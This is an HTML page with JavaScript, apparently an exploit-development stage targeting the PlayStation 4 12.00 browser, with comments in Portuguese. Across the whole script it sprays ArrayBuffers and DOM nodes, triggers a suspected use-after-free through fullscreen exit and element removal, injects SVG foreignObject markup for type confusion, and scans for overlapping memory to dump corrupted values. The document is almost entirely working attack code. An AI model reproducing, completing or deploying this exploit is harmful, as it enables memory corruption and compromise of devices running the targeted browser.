
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Overlap Stage</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Type Confusion → ArrayBuffer Overlap</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 🌍 GLOBAL SPRAY (CRÍTICO)
let ab_views = [];

function setupABSpray(){
    log("[*] Setup ArrayBuffer spray");

    ab_views = [];

    for (let i = 0; i < 12000; i++) {

        let buf = new ArrayBuffer(0x40);
        let view = new Uint32Array(buf);

        view[0] = 0x41414141;
        view[1] = 0x42424242;
        view[2] = 0x43434343;

        ab_views.push(view);
    }

    window.ab_views = ab_views;

    log("[*] Spray pronto: " + ab_views.length);
}

// ==========================
// HEAP SETUP (inalterado)
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (inalterado)
function setupFullscreen(){
    let fsTarget=document.createElement("div");

    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM (mantém padrão)
function reclaim(size){
    log("[*] Reclaim size = " + size);

    // churn
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }

    // DOM spray
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">
                    AAAA
                </div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 OVERLAP PROBE
function overlapProbe(fsTarget){
    log("---- OVERLAP PROBE ----");

    try{
        let n = fsTarget.firstChild;

        if(!n){
            log("[!] no node");
            return;
        }

        log("[CHECK] nodeType = " + n.nodeType);

        if(n.nodeType === 3){

            log("[!!!] TEXTNODE CONFUSION");

            // 💣 WRITE PRIMITIVA
            try{
                n.data = "A".repeat(0x200);
                log("[PWN] write expand OK");
            }catch(e){
                log("[UAF] write crash");
            }

            // 💣 SCAN ARRAYBUFFER
            try{
                for(let i=0;i<ab_views.length;i++){

                    let v = ab_views[i];

                    if(
                        v[0] !== 0x41414141 ||
                        v[1] !== 0x42424242 ||
                        v[2] !== 0x43434343
                    ){
                        log("[!!!] OVERLAP DETECTADO @ " + i);
                        log("[!!!] values = " + v[0] + "," + v[1] + "," + v[2]);

                        // 🔥 dump parcial
                        let dump = [];
                        for(let j=0;j<8;j++){
                            dump.push(v[j]);
                        }

                        log("[DUMP] " + dump.join(","));
                        return;
                    }
                }

                log("[SCAN] nenhum overlap detectado");

            }catch(e){
                log("[UAF] scan crash");
            }

        } else {
            log("[INFO] nao virou TextNode");
        }

    }catch(e){
        log("[UAF] probe crash geral");
    }
}

// ==========================
// TRIGGER (INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){
        log("[ERRO]");
    }

    let sizes=[1500,2000,2500,3000];

    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    // injeção crítica
    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    // probes múltiplos
    setTimeout(()=>overlapProbe(fsTarget), 80);
    setTimeout(()=>overlapProbe(fsTarget), 160);
    setTimeout(()=>overlapProbe(fsTarget), 240);

    // dump final
    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    }, 400);

    // ⚠️ NÃO ALTERAR
    setTimeout(()=>location.reload(), 500);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando teste");

    setupABSpray(); // 🔥 CRÍTICO

    let heap=setupHeap();
    let fsTarget=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
